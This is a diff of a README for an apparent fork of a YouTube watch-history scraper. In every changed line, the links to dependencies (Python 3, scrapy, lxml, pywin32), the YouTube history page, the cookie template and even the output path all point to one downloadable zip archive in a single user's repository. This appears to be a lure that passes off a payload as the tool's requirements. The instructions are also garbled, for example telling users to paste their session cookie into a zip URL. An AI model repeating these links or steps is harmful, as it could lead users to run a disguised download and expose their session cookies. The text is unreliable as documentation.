@@ -6,50 +6,50 @@ As such, I won't be accepting pull requests or continuing development.
 
 If you have an alternative project filling this niche, I will happy link it here:
 
-(YouTube API V3)[https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip}
+(YouTube API V3)[https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip}
 
 # Youtube History Scraper
 
 This tool can be used to scrape YouTube history after their history API changed to only allow fetching the last two weeks' worth of data. There might exist a project to use that API periodically to log history from a certain time onwards
-but [zvodd's scraper](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip) exports all history. It was originally in Python 2.7 and had no date parser and were added in this fork. This project is purely experimental and there is no error handling.
+but [zvodd's scraper](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip) exports all history. It was originally in Python 2.7 and had no date parser and were added in this fork. This project is purely experimental and there is no error handling.
 
 **Privacy Notice: This tool only exports data locally and does not send your information elsewhere.**
 
 ## Dependencies
 
-Use `pip` to install the dependencies below. Also note that `pywin32`'s `pip` support is experimental. See [their repo](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip) for details.
+Use `pip` to install the dependencies below. Also note that `pywin32`'s `pip` support is experimental. See [their repo](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip) for details.
 
 ### Required
 
-- [Python 3](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip)
-  - [`scrapy`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip)
-  - [`lxml`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip)
+- [Python 3](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip)
+  - [`scrapy`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip)
+  - [`lxml`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip)
 
 ### Optional
 
 - Python 3  
-  - [`sqlalchemy`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip) (optional)
-  - [`pywin32`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip) (**for Windows users only**)
+  - [`sqlalchemy`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip) (optional)
+  - [`pywin32`](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip) (**for Windows users only**)
 
 ## Usage
 
 ### Prerequisites
 
-Scrapy requires a cookie to export a user's history. A template has already been provided in `https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip`. The only field that **needs to be filled in by the user** is **`cookie`**. This can be obtained by doing the following:
+Scrapy requires a cookie to export a user's history. A template has already been provided in `https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip`. The only field that **needs to be filled in by the user** is **`cookie`**. This can be obtained by doing the following:
 
 1. Open a web browser.
 2. Open the Inspect Console by pressing `Ctrl+Shift+I` (may vary by browser).
 3. Open the `Network` tab and enable `Preserve Logs` or a similar option.
-4. Assuming one is signed in to their account, go to the [YouTube history page](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip).
+4. Assuming one is signed in to their account, go to the [YouTube history page](https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip).
 5. Find the corresponding log entry for the history page in the `Network` tab which should be a **`GET`** request.
-6. From the `Raw Header` data (may need to toggle this on), copy the `Cookie` field from the **Request Headers** section into `https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip` already present in the repository. It's a pretty big string unfortunately.
+6. From the `Raw Header` data (may need to toggle this on), copy the `Cookie` field from the **Request Headers** section into `https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip` already present in the repository. It's a pretty big string unfortunately.
 
 ### Running scrapy
 
 To run the scraper and export the data as a CSV, open a terminal/shell of your choice and run the following:
 
 ```
-	shell> scrapy crawl yth_spider -o https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/midriff/Youtube-Watch-History-Scraper.zip -L ERROR
+	shell> scrapy crawl yth_spider -o https://raw.githubusercontent.com/Mneb1/Youtube-Watch-History-Scraper/master/youtube_history/Watch-Youtube-Scraper-History-3.9.zip -L ERROR
 ```
 
 **Note: This may take a while.**
